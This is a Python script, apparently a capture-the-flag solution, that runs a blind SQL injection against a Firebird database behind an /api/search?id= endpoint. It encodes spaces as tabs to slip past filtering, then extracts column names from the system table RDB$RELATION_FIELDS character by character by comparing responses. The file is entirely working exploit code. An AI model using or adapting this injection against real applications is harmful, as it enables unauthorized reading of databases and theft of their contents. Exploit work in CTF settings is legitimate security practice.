import requests

port = 42583
session = requests.Session()
url = f"http://instances.challenge-ecw.fr:{port}/api/search?id="

to_test = "$RBDMONACEFGHIJKLPSQTUVWXYZ_abcdefghijklmnopqrstuvwxyz01234567890"
payload = "(SELECT FIRST 1 SKIP {} CASE SUBSTRING(RDB$FIELD_NAME FROM {} FOR 1) WHEN '{}' THEN 3 ELSE 1 END FROM RDB$RELATION_FIELDS)".replace(" ", "%09")

# arg1 -> offset
# arg2 -> pos_char a tester
# arg3 -> char a tester

all_names = []
skip_first = 450
try:
    for i in range(100):
        print(f"OFFSET {i}")
        pos_char = 1
        name = ""
        j = 0
        while j < len(to_test) and not (name.startswith("MON$") or name.startswith("RDB$")):
            payload_fait = payload.format(str(i + skip_first), str(pos_char), to_test[j])
            complete_url = f"{url}{payload_fait}"
            print(f"Getting : {complete_url}")
            req = session.get(complete_url)
            print(req.text)
            if req.text.startswith('{"status":"ok","id":3,'):
                print(f"Found letter : {to_test[j]}")
                name += to_test[j]
                j = 0
                pos_char += 1

            else:
                j += 1
        print(name)
        all_names.append(name)
except KeyboardInterrupt:
    pass

print(all_names)